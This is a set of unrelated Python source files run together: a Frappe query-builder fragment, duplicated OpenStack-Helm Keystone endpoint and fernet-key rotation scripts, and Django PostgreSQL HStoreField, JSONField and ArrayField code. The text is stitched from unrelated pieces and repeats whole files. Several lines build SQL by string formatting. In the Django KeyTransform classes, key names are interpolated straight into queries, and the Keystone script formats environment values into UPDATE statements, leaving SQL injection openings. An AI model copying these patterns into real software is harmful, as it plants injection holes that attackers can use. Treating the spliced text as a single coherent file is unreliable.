					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)

	# If doctype is child table
	if frappe.is_table(doctype):
		# Example frappe.db.get_list('Purchase Receipt Item', {'parent': 'Purchase Receipt'})
		# Here purchase receipt is the parent doctype of the child doctype Purchase Receipt Item

		if not kwargs.get('parent'):
			frappe.flags.error_message = _('Parent is required to get child table data')
			raise frappe.PermissionError(doctype)

		check_parent_permission(kwargs.get('parent'), doctype)
		del kwargs['parent']

	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

{{/*
Copyright 2017 The Openstack-Helm Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/}}

#!/usr/bin/env python
import os
import sys
import ConfigParser
import logging
from sqlalchemy import create_engine

# Create logger, console handler and formatter
logger = logging.getLogger('OpenStack-Helm Keystone Endpoint management')
logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Set the formatter and add the handler
ch.setFormatter(formatter)
logger.addHandler(ch)

# Get the connection string for the service db
if "OPENSTACK_CONFIG_FILE" in os.environ:
    os_conf = os.environ['OPENSTACK_CONFIG_FILE']
    if "OPENSTACK_CONFIG_DB_SECTION" in os.environ:
        os_conf_section = os.environ['OPENSTACK_CONFIG_DB_SECTION']
    else:
        logger.critical('environment variable OPENSTACK_CONFIG_DB_SECTION not set')
        sys.exit(1)
    if "OPENSTACK_CONFIG_DB_KEY" in os.environ:
        os_conf_key = os.environ['OPENSTACK_CONFIG_DB_KEY']
    else:
        logger.critical('environment variable OPENSTACK_CONFIG_DB_KEY not set')
        sys.exit(1)
    try:
        config = ConfigParser.RawConfigParser()
        logger.info("Using {0} as db config source".format(os_conf))
        config.read(os_conf)
        logger.info("Trying to load db config from {0}:{1}".format(
            os_conf_section, os_conf_key))
        user_db_conn = config.get(os_conf_section, os_conf_key)
        logger.info("Got config from {0}".format(os_conf))
    except:
        logger.critical("Tried to load config from {0} but failed.".format(os_conf))
        raise
elif "DB_CONNECTION" in os.environ:
    user_db_conn = os.environ['DB_CONNECTION']
    logger.info('Got config from DB_CONNECTION env var')
else:
    logger.critical('Could not get db config, either from config file or env var')
    sys.exit(1)

# User DB engine
try:
    user_engine = create_engine(user_db_conn)
except:
    logger.critical('Could not get user database config')
    raise

# Set Internal Endpoint
try:
    endpoint_url = os.environ['OS_BOOTSTRAP_INTERNAL_URL']
    user_engine.execute(                    
        "update endpoint set url = '{0}' where interface ='internal' and service_id = (select id from service where service.type = 'identity')".                    
        format(endpoint_url))                    
except:
    logger.critical("Could not update internal endpoint")
    raise

# Set Admin Endpoint
try:
    endpoint_url = os.environ['OS_BOOTSTRAP_ADMIN_URL']
    user_engine.execute(                    
        "update endpoint set url = '{0}' where interface ='admin' and service_id = (select id from service where service.type = 'identity')".                    
        format(endpoint_url))                    
except:
    logger.critical("Could not update admin endpoint")
    raise

# Set Public Endpoint
try:
    endpoint_url = os.environ['OS_BOOTSTRAP_PUBLIC_URL']
    user_engine.execute(                    
        "update endpoint set url = '{0}' where interface ='public' and service_id = (select id from service where service.type = 'identity')".                    
        format(endpoint_url))                    
except:
    logger.critical("Could not update public endpoint")
    raise

# Print endpoints
try:
    endpoints = user_engine.execute(                    
        "select interface, url from endpoint where service_id = (select id from service where service.type = 'identity')"
    ).fetchall()
    for row in endpoints:
        logger.info("endpoint ({0}): {1}".format(row[0], row[1]))
except:
    logger.critical("Could not update endpoint")
    raise

logger.info('Finished Endpoint Management')

#!/usr/bin/env python

{{/*
Copyright 2017 The Openstack-Helm Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/}}

import argparse
import base64
import errno
import grp
import logging
import os
import pwd
import re
import six
import subprocess                    
import sys
import time

import requests

FERNET_DIR = os.environ['KEYSTONE_KEYS_REPOSITORY']
KEYSTONE_USER = os.environ['KEYSTONE_USER']
KEYSTONE_GROUP = os.environ['KEYSTONE_GROUP']
NAMESPACE = os.environ['KUBERNETES_NAMESPACE']

# k8s connection data
KUBE_HOST = None
KUBE_CERT = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
KUBE_TOKEN = None

LOG_DATEFMT = "%Y-%m-%d %H:%M:%S"
LOG_FORMAT = "%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s"
logging.basicConfig(format=LOG_FORMAT, datefmt=LOG_DATEFMT)
LOG = logging.getLogger(__name__)
LOG.setLevel(logging.INFO)


def read_kube_config():
    global KUBE_HOST, KUBE_TOKEN
    KUBE_HOST = "https://%s:%s" % ('kubernetes.default',
                                   os.environ['KUBERNETES_SERVICE_PORT'])
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
        KUBE_TOKEN = f.read()


def get_secret_definition(name):
    url = '%s/api/v1/namespaces/%s/secrets/%s' % (KUBE_HOST, NAMESPACE, name)
    resp = requests.get(url,
                        headers={'Authorization': 'Bearer %s' % KUBE_TOKEN},
                        verify=KUBE_CERT)
    if resp.status_code != 200:
        LOG.error('Cannot get secret %s.', name)
        LOG.error(resp.text)
        return None
    return resp.json()


def update_secret(name, secret):
    url = '%s/api/v1/namespaces/%s/secrets/%s' % (KUBE_HOST, NAMESPACE, name)
    resp = requests.put(url,
                        json=secret,
                        headers={'Authorization': 'Bearer %s' % KUBE_TOKEN},
                        verify=KUBE_CERT)
    if resp.status_code != 200:
        LOG.error('Cannot update secret %s.', name)
        LOG.error(resp.text)
        return False
    return True


def read_from_files():
    keys = filter(
        lambda name: os.path.isfile(FERNET_DIR + name) and re.match("^\d+$",
                                                                    name),
        os.listdir(FERNET_DIR)
    )
    data = {}
    for key in keys:
        with open(FERNET_DIR + key, 'r') as f:
            data[key] = f.read()
    if len(keys):
        LOG.debug("Keys read from files: %s", keys)
    else:
        LOG.warn("No keys were read from files.")
    return data


def get_keys_data():
    keys = read_from_files()
    return dict([(key, base64.b64encode(value.encode()).decode())
                for (key, value) in six.iteritems(keys)])


def write_to_files(data):
    if not os.path.exists(os.path.dirname(FERNET_DIR)):
        try:
            os.makedirs(os.path.dirname(FERNET_DIR))
        except OSError as exc: # Guard against race condition
            if exc.errno != errno.EEXIST:
                raise
        uid = pwd.getpwnam(KEYSTONE_USER).pw_uid
        gid = grp.getgrnam(KEYSTONE_GROUP).gr_gid
        os.chown(FERNET_DIR, uid, gid)

    for (key, value) in six.iteritems(data):
        with open(FERNET_DIR + key, 'w') as f:
            decoded_value = base64.b64decode(value).decode()
            f.write(decoded_value)
            LOG.debug("Key %s: %s", key, decoded_value)
    LOG.info("%s keys were written", len(data))


def execute_command(cmd):
    LOG.info("Executing 'keystone-manage %s --keystone-user=%s "
             "--keystone-group=%s' command.",
             cmd, KEYSTONE_USER, KEYSTONE_GROUP)
    subprocess.call(['keystone-manage', cmd,                    
                     '--keystone-user=%s' % KEYSTONE_USER,
                     '--keystone-group=%s' % KEYSTONE_GROUP])

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('command', choices=['fernet_setup', 'fernet_rotate',
                                            'credential_setup',
                                            'credential_rotate'])
    args = parser.parse_args()

    is_credential = args.command.startswith('credential')

    SECRET_NAME = ('keystone-credential-keys' if is_credential else
                   'keystone-fernet-keys')

    read_kube_config()
    secret = get_secret_definition(SECRET_NAME)
    if not secret:
        LOG.error("Secret '%s' does not exist.", SECRET_NAME)
        sys.exit(1)

    if args.command in ('fernet_rotate', 'credential_rotate'):
        LOG.info("Copying existing %s keys from secret '%s' to %s.",
                 'credential' if is_credential else 'fernet', SECRET_NAME,
                 FERNET_DIR)
        write_to_files(secret['data'])

    execute_command(args.command)

    LOG.info("Updating data for '%s' secret.", SECRET_NAME)
    updated_keys = get_keys_data()
    secret['data'] = updated_keys
    if not update_secret(SECRET_NAME, secret):
        sys.exit(1)
    LOG.info("%s fernet keys have been placed to secret '%s'",
             len(updated_keys), SECRET_NAME)
    LOG.debug("Placed keys: %s", updated_keys)
    LOG.info("%s keys %s has been completed",
             "Credential" if is_credential else 'Fernet',
             "rotation" if args.command.endswith('_rotate') else "generation")

    if args.command == 'credential_rotate':
        # `credential_rotate` needs doing `credential_migrate` as well once all
        # of the nodes have the new keys. So we'll sleep configurable amount of
        # time to make sure k8s reloads the secrets in all pods and then
        # execute `credential_migrate`.

        migrate_wait = int(os.getenv('KEYSTONE_CREDENTIAL_MIGRATE_WAIT', "60"))
        LOG.info("Waiting %d seconds to execute `credential_migrate`.",
                 migrate_wait)
        time.sleep(migrate_wait)

        execute_command('credential_migrate')

if __name__ == "__main__":
    main()

{{/*
Copyright 2017 The Openstack-Helm Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/}}

#!/usr/bin/env python
import os
import sys
import ConfigParser
import logging
from sqlalchemy import create_engine

# Create logger, console handler and formatter
logger = logging.getLogger('OpenStack-Helm Keystone Endpoint management')
logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Set the formatter and add the handler
ch.setFormatter(formatter)
logger.addHandler(ch)

# Get the connection string for the service db
if "OPENSTACK_CONFIG_FILE" in os.environ:
    os_conf = os.environ['OPENSTACK_CONFIG_FILE']
    if "OPENSTACK_CONFIG_DB_SECTION" in os.environ:
        os_conf_section = os.environ['OPENSTACK_CONFIG_DB_SECTION']
    else:
        logger.critical('environment variable OPENSTACK_CONFIG_DB_SECTION not set')
        sys.exit(1)
    if "OPENSTACK_CONFIG_DB_KEY" in os.environ:
        os_conf_key = os.environ['OPENSTACK_CONFIG_DB_KEY']
    else:
        logger.critical('environment variable OPENSTACK_CONFIG_DB_KEY not set')
        sys.exit(1)
    try:
        config = ConfigParser.RawConfigParser()
        logger.info("Using {0} as db config source".format(os_conf))
        config.read(os_conf)
        logger.info("Trying to load db config from {0}:{1}".format(
            os_conf_section, os_conf_key))
        user_db_conn = config.get(os_conf_section, os_conf_key)
        logger.info("Got config from {0}".format(os_conf))
    except:
        logger.critical("Tried to load config from {0} but failed.".format(os_conf))
        raise
elif "DB_CONNECTION" in os.environ:
    user_db_conn = os.environ['DB_CONNECTION']
    logger.info('Got config from DB_CONNECTION env var')
else:
    logger.critical('Could not get db config, either from config file or env var')
    sys.exit(1)

# User DB engine
try:
    user_engine = create_engine(user_db_conn)
except:
    logger.critical('Could not get user database config')
    raise

# Set Internal Endpoint
try:
    endpoint_url = os.environ['OS_BOOTSTRAP_INTERNAL_URL']
    user_engine.execute(                    
        "update endpoint set url = '{0}' where interface ='internal' and service_id = (select id from service where service.type = 'identity')".                    
        format(endpoint_url))                    
except:
    logger.critical("Could not update internal endpoint")
    raise

# Set Admin Endpoint
try:
    endpoint_url = os.environ['OS_BOOTSTRAP_ADMIN_URL']
    user_engine.execute(                    
        "update endpoint set url = '{0}' where interface ='admin' and service_id = (select id from service where service.type = 'identity')".                    
        format(endpoint_url))                    
except:
    logger.critical("Could not update admin endpoint")
    raise

# Set Public Endpoint
try:
    endpoint_url = os.environ['OS_BOOTSTRAP_PUBLIC_URL']
    user_engine.execute(                    
        "update endpoint set url = '{0}' where interface ='public' and service_id = (select id from service where service.type = 'identity')".                    
        format(endpoint_url))                    
except:
    logger.critical("Could not update public endpoint")
    raise

# Print endpoints
try:
    endpoints = user_engine.execute(                    
        "select interface, url from endpoint where service_id = (select id from service where service.type = 'identity')"
    ).fetchall()
    for row in endpoints:
        logger.info("endpoint ({0}): {1}".format(row[0], row[1]))
except:
    logger.critical("Could not update endpoint")
    raise

logger.info('Finished Endpoint Management')

#!/usr/bin/env python

{{/*
Copyright 2017 The Openstack-Helm Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/}}

import argparse
import base64
import errno
import grp
import logging
import os
import pwd
import re
import six
import subprocess                    
import sys
import time

import requests

FERNET_DIR = os.environ['KEYSTONE_KEYS_REPOSITORY']
KEYSTONE_USER = os.environ['KEYSTONE_USER']
KEYSTONE_GROUP = os.environ['KEYSTONE_GROUP']
NAMESPACE = os.environ['KUBERNETES_NAMESPACE']

# k8s connection data
KUBE_HOST = None
KUBE_CERT = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
KUBE_TOKEN = None

LOG_DATEFMT = "%Y-%m-%d %H:%M:%S"
LOG_FORMAT = "%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s"
logging.basicConfig(format=LOG_FORMAT, datefmt=LOG_DATEFMT)
LOG = logging.getLogger(__name__)
LOG.setLevel(logging.INFO)


def read_kube_config():
    global KUBE_HOST, KUBE_TOKEN
    KUBE_HOST = "https://%s:%s" % ('kubernetes.default',
                                   os.environ['KUBERNETES_SERVICE_PORT'])
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
        KUBE_TOKEN = f.read()


def get_secret_definition(name):
    url = '%s/api/v1/namespaces/%s/secrets/%s' % (KUBE_HOST, NAMESPACE, name)
    resp = requests.get(url,
                        headers={'Authorization': 'Bearer %s' % KUBE_TOKEN},
                        verify=KUBE_CERT)
    if resp.status_code != 200:
        LOG.error('Cannot get secret %s.', name)
        LOG.error(resp.text)
        return None
    return resp.json()


def update_secret(name, secret):
    url = '%s/api/v1/namespaces/%s/secrets/%s' % (KUBE_HOST, NAMESPACE, name)
    resp = requests.put(url,
                        json=secret,
                        headers={'Authorization': 'Bearer %s' % KUBE_TOKEN},
                        verify=KUBE_CERT)
    if resp.status_code != 200:
        LOG.error('Cannot update secret %s.', name)
        LOG.error(resp.text)
        return False
    return True


def read_from_files():
    keys = filter(
        lambda name: os.path.isfile(FERNET_DIR + name) and re.match("^\d+$",
                                                                    name),
        os.listdir(FERNET_DIR)
    )
    data = {}
    for key in keys:
        with open(FERNET_DIR + key, 'r') as f:
            data[key] = f.read()
    if len(keys):
        LOG.debug("Keys read from files: %s", keys)
    else:
        LOG.warn("No keys were read from files.")
    return data


def get_keys_data():
    keys = read_from_files()
    return dict([(key, base64.b64encode(value.encode()).decode())
                for (key, value) in six.iteritems(keys)])


def write_to_files(data):
    if not os.path.exists(os.path.dirname(FERNET_DIR)):
        try:
            os.makedirs(os.path.dirname(FERNET_DIR))
        except OSError as exc: # Guard against race condition
            if exc.errno != errno.EEXIST:
                raise
        uid = pwd.getpwnam(KEYSTONE_USER).pw_uid
        gid = grp.getgrnam(KEYSTONE_GROUP).gr_gid
        os.chown(FERNET_DIR, uid, gid)

    for (key, value) in six.iteritems(data):
        with open(FERNET_DIR + key, 'w') as f:
            decoded_value = base64.b64decode(value).decode()
            f.write(decoded_value)
            LOG.debug("Key %s: %s", key, decoded_value)
    LOG.info("%s keys were written", len(data))


def execute_command(cmd):
    LOG.info("Executing 'keystone-manage %s --keystone-user=%s "
             "--keystone-group=%s' command.",
             cmd, KEYSTONE_USER, KEYSTONE_GROUP)
    subprocess.call(['keystone-manage', cmd,                    
                     '--keystone-user=%s' % KEYSTONE_USER,
                     '--keystone-group=%s' % KEYSTONE_GROUP])

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('command', choices=['fernet_setup', 'fernet_rotate',
                                            'credential_setup',
                                            'credential_rotate'])
    args = parser.parse_args()

    is_credential = args.command.startswith('credential')

    SECRET_NAME = ('keystone-credential-keys' if is_credential else
                   'keystone-fernet-keys')

    read_kube_config()
    secret = get_secret_definition(SECRET_NAME)
    if not secret:
        LOG.error("Secret '%s' does not exist.", SECRET_NAME)
        sys.exit(1)

    if args.command in ('fernet_rotate', 'credential_rotate'):
        LOG.info("Copying existing %s keys from secret '%s' to %s.",
                 'credential' if is_credential else 'fernet', SECRET_NAME,
                 FERNET_DIR)
        write_to_files(secret['data'])

    execute_command(args.command)

    LOG.info("Updating data for '%s' secret.", SECRET_NAME)
    updated_keys = get_keys_data()
    secret['data'] = updated_keys
    if not update_secret(SECRET_NAME, secret):
        sys.exit(1)
    LOG.info("%s fernet keys have been placed to secret '%s'",
             len(updated_keys), SECRET_NAME)
    LOG.debug("Placed keys: %s", updated_keys)
    LOG.info("%s keys %s has been completed",
             "Credential" if is_credential else 'Fernet',
             "rotation" if args.command.endswith('_rotate') else "generation")

    if args.command == 'credential_rotate':
        # `credential_rotate` needs doing `credential_migrate` as well once all
        # of the nodes have the new keys. So we'll sleep configurable amount of
        # time to make sure k8s reloads the secrets in all pods and then
        # execute `credential_migrate`.

        migrate_wait = int(os.getenv('KEYSTONE_CREDENTIAL_MIGRATE_WAIT', "60"))
        LOG.info("Waiting %d seconds to execute `credential_migrate`.",
                 migrate_wait)
        time.sleep(migrate_wait)

        execute_command('credential_migrate')

if __name__ == "__main__":
    main()

import json

from django.contrib.postgres import forms, lookups
from django.contrib.postgres.fields.array import ArrayField
from django.core import exceptions
from django.db.models import Field, TextField, Transform
from django.utils.translation import gettext_lazy as _

from .mixins import CheckFieldDefaultMixin

__all__ = ['HStoreField']


class HStoreField(CheckFieldDefaultMixin, Field):
    empty_strings_allowed = False
    description = _('Map of strings to strings/nulls')
    default_error_messages = {
        'not_a_string': _('The value of ‚Äú%(key)s‚Äù is not a string or null.'),
    }
    _default_hint = ('dict', '{}')

    def db_type(self, connection):
        return 'hstore'

    def get_transform(self, name):
        transform = super().get_transform(name)
        if transform:
            return transform
        return KeyTransformFactory(name)

    def validate(self, value, model_instance):
        super().validate(value, model_instance)
        for key, val in value.items():
            if not isinstance(val, str) and val is not None:
                raise exceptions.ValidationError(
                    self.error_messages['not_a_string'],
                    code='not_a_string',
                    params={'key': key},
                )

    def to_python(self, value):
        if isinstance(value, str):
            value = json.loads(value)
        return value

    def value_to_string(self, obj):
        return json.dumps(self.value_from_object(obj))

    def formfield(self, **kwargs):
        return super().formfield(**{
            'form_class': forms.HStoreField,
            **kwargs,
        })

    def get_prep_value(self, value):
        value = super().get_prep_value(value)

        if isinstance(value, dict):
            prep_value = {}
            for key, val in value.items():
                key = str(key)
                if val is not None:
                    val = str(val)
                prep_value[key] = val
            value = prep_value

        if isinstance(value, list):
            value = [str(item) for item in value]

        return value


HStoreField.register_lookup(lookups.DataContains)
HStoreField.register_lookup(lookups.ContainedBy)
HStoreField.register_lookup(lookups.HasKey)
HStoreField.register_lookup(lookups.HasKeys)
HStoreField.register_lookup(lookups.HasAnyKeys)


class KeyTransform(Transform):
    output_field = TextField()

    def __init__(self, key_name, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.key_name = key_name

    def as_sql(self, compiler, connection):
        lhs, params = compiler.compile(self.lhs)
        return "(%s -> '%s')" % (lhs, self.key_name), params                    


class KeyTransformFactory:

    def __init__(self, key_name):
        self.key_name = key_name

    def __call__(self, *args, **kwargs):
        return KeyTransform(self.key_name, *args, **kwargs)


@HStoreField.register_lookup
class KeysTransform(Transform):
    lookup_name = 'keys'
    function = 'akeys'
    output_field = ArrayField(TextField())


@HStoreField.register_lookup
class ValuesTransform(Transform):
    lookup_name = 'values'
    function = 'avals'
    output_field = ArrayField(TextField())

import json

from psycopg2.extras import Json

from django.contrib.postgres import forms, lookups
from django.core import exceptions
from django.db.models import (
    Field, TextField, Transform, lookups as builtin_lookups,
)
from django.utils.translation import gettext_lazy as _

from .mixins import CheckFieldDefaultMixin

__all__ = ['JSONField']


class JsonAdapter(Json):
    """
    Customized psycopg2.extras.Json to allow for a custom encoder.
    """
    def __init__(self, adapted, dumps=None, encoder=None):
        self.encoder = encoder
        super().__init__(adapted, dumps=dumps)

    def dumps(self, obj):
        options = {'cls': self.encoder} if self.encoder else {}
        return json.dumps(obj, **options)


class JSONField(CheckFieldDefaultMixin, Field):
    empty_strings_allowed = False
    description = _('A JSON object')
    default_error_messages = {
        'invalid': _("Value must be valid JSON."),
    }
    _default_hint = ('dict', '{}')

    def __init__(self, verbose_name=None, name=None, encoder=None, **kwargs):
        if encoder and not callable(encoder):
            raise ValueError("The encoder parameter must be a callable object.")
        self.encoder = encoder
        super().__init__(verbose_name, name, **kwargs)

    def db_type(self, connection):
        return 'jsonb'

    def deconstruct(self):
        name, path, args, kwargs = super().deconstruct()
        if self.encoder is not None:
            kwargs['encoder'] = self.encoder
        return name, path, args, kwargs

    def get_transform(self, name):
        transform = super().get_transform(name)
        if transform:
            return transform
        return KeyTransformFactory(name)

    def get_prep_value(self, value):
        if value is not None:
            return JsonAdapter(value, encoder=self.encoder)
        return value

    def validate(self, value, model_instance):
        super().validate(value, model_instance)
        options = {'cls': self.encoder} if self.encoder else {}
        try:
            json.dumps(value, **options)
        except TypeError:
            raise exceptions.ValidationError(
                self.error_messages['invalid'],
                code='invalid',
                params={'value': value},
            )

    def value_to_string(self, obj):
        return self.value_from_object(obj)

    def formfield(self, **kwargs):
        return super().formfield(**{
            'form_class': forms.JSONField,
            **kwargs,
        })


JSONField.register_lookup(lookups.DataContains)
JSONField.register_lookup(lookups.ContainedBy)
JSONField.register_lookup(lookups.HasKey)
JSONField.register_lookup(lookups.HasKeys)
JSONField.register_lookup(lookups.HasAnyKeys)
JSONField.register_lookup(lookups.JSONExact)


class KeyTransform(Transform):
    operator = '->'
    nested_operator = '#>'

    def __init__(self, key_name, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.key_name = key_name

    def as_sql(self, compiler, connection):
        key_transforms = [self.key_name]
        previous = self.lhs
        while isinstance(previous, KeyTransform):
            key_transforms.insert(0, previous.key_name)
            previous = previous.lhs
        lhs, params = compiler.compile(previous)
        if len(key_transforms) > 1:
            return "(%s %s %%s)" % (lhs, self.nested_operator), [key_transforms] + params
        try:
            int(self.key_name)                    
        except ValueError:
            lookup = "'%s'" % self.key_name                    
        else:
            lookup = "%s" % self.key_name                    
        return "(%s %s %s)" % (lhs, self.operator, lookup), params                    


class KeyTextTransform(KeyTransform):
    operator = '->>'
    nested_operator = '#>>'
    output_field = TextField()


class KeyTransformTextLookupMixin:
    """
    Mixin for combining with a lookup expecting a text lhs from a JSONField
    key lookup. Make use of the ->> operator instead of casting key values to
    text and performing the lookup on the resulting representation.
    """
    def __init__(self, key_transform, *args, **kwargs):
        assert isinstance(key_transform, KeyTransform)
        key_text_transform = KeyTextTransform(
            key_transform.key_name, *key_transform.source_expressions, **key_transform.extra
        )
        super().__init__(key_text_transform, *args, **kwargs)


class KeyTransformIExact(KeyTransformTextLookupMixin, builtin_lookups.IExact):
    pass


class KeyTransformIContains(KeyTransformTextLookupMixin, builtin_lookups.IContains):
    pass


class KeyTransformStartsWith(KeyTransformTextLookupMixin, builtin_lookups.StartsWith):
    pass


class KeyTransformIStartsWith(KeyTransformTextLookupMixin, builtin_lookups.IStartsWith):
    pass


class KeyTransformEndsWith(KeyTransformTextLookupMixin, builtin_lookups.EndsWith):
    pass


class KeyTransformIEndsWith(KeyTransformTextLookupMixin, builtin_lookups.IEndsWith):
    pass


class KeyTransformRegex(KeyTransformTextLookupMixin, builtin_lookups.Regex):
    pass


class KeyTransformIRegex(KeyTransformTextLookupMixin, builtin_lookups.IRegex):
    pass


KeyTransform.register_lookup(KeyTransformIExact)
KeyTransform.register_lookup(KeyTransformIContains)
KeyTransform.register_lookup(KeyTransformStartsWith)
KeyTransform.register_lookup(KeyTransformIStartsWith)
KeyTransform.register_lookup(KeyTransformEndsWith)
KeyTransform.register_lookup(KeyTransformIEndsWith)
KeyTransform.register_lookup(KeyTransformRegex)
KeyTransform.register_lookup(KeyTransformIRegex)


class KeyTransformFactory:

    def __init__(self, key_name):
        self.key_name = key_name

    def __call__(self, *args, **kwargs):
        return KeyTransform(self.key_name, *args, **kwargs)

import json

from django.contrib.postgres import lookups
from django.contrib.postgres.forms import SimpleArrayField
from django.contrib.postgres.validators import ArrayMaxLengthValidator
from django.core import checks, exceptions
from django.db.models import Field, IntegerField, Transform
from django.db.models.lookups import Exact, In
from django.utils.translation import gettext_lazy as _

from ..utils import prefix_validation_error
from .mixins import CheckFieldDefaultMixin
from .utils import AttributeSetter

__all__ = ['ArrayField']


class ArrayField(CheckFieldDefaultMixin, Field):
    empty_strings_allowed = False
    default_error_messages = {
        'item_invalid': _('Item %(nth)s in the array did not validate:'),
        'nested_array_mismatch': _('Nested arrays must have the same length.'),
    }
    _default_hint = ('list', '[]')

    def __init__(self, base_field, size=None, **kwargs):
        self.base_field = base_field
        self.size = size
        if self.size:
            self.default_validators = [*self.default_validators, ArrayMaxLengthValidator(self.size)]
        # For performance, only add a from_db_value() method if the base field
        # implements it.
        if hasattr(self.base_field, 'from_db_value'):
            self.from_db_value = self._from_db_value
        super().__init__(**kwargs)

    @property
    def model(self):
        try:
            return self.__dict__['model']
        except KeyError:
            raise AttributeError("'%s' object has no attribute 'model'" % self.__class__.__name__)

    @model.setter
    def model(self, model):
        self.__dict__['model'] = model
        self.base_field.model = model

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        if self.base_field.remote_field:
            errors.append(
                checks.Error(
                    'Base field for array cannot be a related field.',
                    obj=self,
                    id='postgres.E002'
                )
            )
        else:
            # Remove the field name checks as they are not needed here.
            base_errors = self.base_field.check()
            if base_errors:
                messages = '\n    '.join('%s (%s)' % (error.msg, error.id) for error in base_errors)
                errors.append(
                    checks.Error(
                        'Base field for array has errors:\n    %s' % messages,
                        obj=self,
                        id='postgres.E001'
                    )
                )
        return errors

